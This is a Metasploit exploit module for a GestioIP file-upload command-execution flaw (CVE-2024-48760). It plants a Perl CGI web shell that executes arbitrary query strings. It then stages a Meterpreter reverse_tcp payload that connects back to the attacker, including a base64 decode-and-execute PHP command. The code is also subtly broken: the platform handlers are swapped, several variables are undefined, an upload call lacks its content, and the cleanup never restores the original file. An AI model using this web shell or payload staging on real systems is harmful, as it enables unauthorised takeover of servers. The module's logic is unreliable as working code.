##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GestioIP 3.5.7 Remote Command Execution',
        'Description' => %q{
          This module exploits a command execution via file upload.
          If GestioIP is configured to use no authentication for admin account,
          no password is required to exploit the vulnerability. Otherwise, an authenticated
          user with admin right on the web site is required to exploit.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'maxibelino', # Original finder of CVE-2024-48760
          'odeez24' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2024-48760' ],
          [ 'URL', 'https://github.com/maxibelino/CVEs/tree/main/CVE-2024-48760']
        ],
        'Platform' => [ 'unix' ],
        'Arch' => ARCH_CMD,
        'Targets' => [
          [
            'Linux/unix Command',
            {
              'Arch' => [ ARCH_X86, ARCH_X64 ],
              'Platform' => ['linux'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
              },
              'CmdStagerFlavor' => [ 'printf', 'echo', 'bourne' ]
            }
          ],
          [
            'PHP Meterpreter',
            {
              'Arch' => [ ARCH_PHP ],
              'Platform' => ['php'],
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              },
              'CmdStagerFlavor' => [ 'php_mkdir', 'php_base64']
            }
          ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2025-01-14',
        'DefaultTarget' => 0,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        OptString.new('HttpUsername', [true, 'The username to auth as with admin right', 'gipadmin']),
        OptString.new('HttpPassword', [true, 'The password to auth with', '']),
        OptString.new('LHOST', [true, 'IP adresse you want the payload to connect back', '']),
        OptString.new('LPORT', [true, 'Port you want the payload to connect back', ''])
      ]
    )
  end

  def post_auth?
    true
  end

  def target_link
    '/api/upload.cgi'
  end

  def user
    datastore['HttpUsername']
  end

  def pass
    datastore['HttpPassword']
  end

  def use_auth
    !(pass.nil? or pass.empty?)
  end

  def backdoor_content
    <<~PERL
      #!/usr/bin/perl -w
      use strict;
      print "Cache-Control: no-cache\\n";
      print "Content-type: text/html\\n\\n";
      my $req = $ENV{QUERY_STRING};
      chomp ($req);
      $req =~ s/%20/ /g;#{' '}
      $req =~ s/%3b/;/g;
      $req =~ s/%7c/|/gi;
      $req =~ s/%27/'/g;
      $req =~ s/%22/"/g;
      $req =~ s/%5D/]/g;
      $req =~ s/%5B/[/g;
      print "<html><body><!-- CGI backdoor -->";
      if (!$req) {
          print "Usage: upload.cgi?whoami";
      } else {
          my @cmd = `$req`;
          print "<pre>";
          foreach my $line (@cmd) {
              print $line;
          }
          print "</pre>";
      }
      print "</body></html>";
    PERL
  end

  # Execute command on the target server
  #
  # @param cmd [String] the command to execute
  # @return [Boolean] true if the command was executed successfully, false
  # otherwise
  def execute_command(cmd, _opts = {})
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, target_link),
      'vars_get' => {
        'cmd' => cmd
      }
    })

    if res && res.code == 200
      return true
    else
      return false
    end
  end

  # Check if the command execution is possible
  #
  # @return [Boolean] true if command execution is possible, false otherwise
  def check_execution
    test_cmd = 'whoami'
    return execute_command(test_cmd)
  end

  # Upload the payload to the target server
  #
  # @return [Boolean] true if the payload was uploaded successfully, false
  # otherwise
  def upload_payload
    print_status('Uploading payload to the target server...')

    execute_cmdstager(
      linemax: 500,
      nodelete: false,
      background: true,
      temp: '/tmp'
    )
  end

  # Download the
  def download_upload
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, target_link),
      'vars_get' => {
        'file' => filename
      }
    })

    if res && res.code == 200
      store_loot(
        'upload.cgi',
        'text/plain',
        rhost,
        res.body,
        'upload.cgi',
        'Upload file GestioIP config file'
      )
      return res.body
    else
      return nil
    end
  end

  def get_original_content
    return nil unless framework.db && framework.db.active

    loots = framework.db.loots(
      workspace: framework.db.workspace,
      host: rhost,
      ltype: 'gestioip.bak'
    )

    if loots.empty?
      print_error('No backup found in the loot')
      return nil
    end

    last_loot = loots.last
    local_path = last_loot.path
    return File.read(local_path)
  end

  # Upload the file on the target_link
  #
  # @param file [String] the file to upload
  # @return [Boolean] true if the file was successfullt upload, false otherwise.
  def upload_file(filename, content)
    data = Rex::MIME::Message.new
    data.add_part(
      content,
      'application/x-httpd-cgi',
      nil,
      "form-data; name=\"file\"; filename=\"#{filename}.cgi\""
    )

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, target_link),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => data.to_s
    })
    if res && res.code == 200
      return true
    else
      return false
    end
  end

  # Execute PHP code on the target server in order to run the payload
  def execute_php
    b64_payload = Rex::Text.encode_base64(payload.encoded)
    filename = "/tmp/#{Rex::Text.rand_text_alpha(8)}.php"

    print_status('Uploading PHP Meterpreter payload...')

    php_cmd = "echo #{b64_payload} | base64 -d > #{filename}; php #{filename} &"
    print_status("Executing payload #{filename}...")
    execute_command(php_cmd)

    print_good('PHP Meterpreter payload executed successfully.')

    print_status("Removing payload file: #{filename}")
    execute_command("rm #{filename}")
  end

  # Upload the payload to the target server
  def execute_linux
    print_status('Uploading payload to the target server...')

    execute_cmdstager(
      linemax: 500,
      nodelete: false,
      background: true,
      temp: '/tmp'
    )

    print_good('Payload uploaded successfully.')
  end

  def clean_upload
    print_status('Backing up the original upload file ...')
    original_data = get_original_content

    if original_data.nil?
      print_warning('Restauration impossible : contenu original introuvable.')
      return
    end
    print_good("Backup saved to loot: #{loot_path}")

    print_status("Cleaning up #{target_link} to remove backdoor ...")
  end

  def exploit
    print_status('Download the original upload file for backup ...')
    res = download_upload
    if (res.nil?)
      print_warning("Can't download the upload file. This")
    end
    print_good('Backup file successfully download')
    print_status('Upload the backdoor file ...')
    res = upload_file('upload.cgi', backdoor_content)
    if (!res)
      print_error('Impossible to upload the backdoor file')
    end
    unless check_execution
      fail_with(Failure::NotVulnerable, 'Command execution failed. The exploit was not successful.')
    end

    case target['Platform']
    when 'linux'
      execute_php
    when 'php'
      execute_linux
    end

    original_data = get_original_content

    if original_data.nil?
      print_warning('Restauration impossible : contenu original introuvable.')
      return
    end

    upload_file('upload.cgi')
  end
end
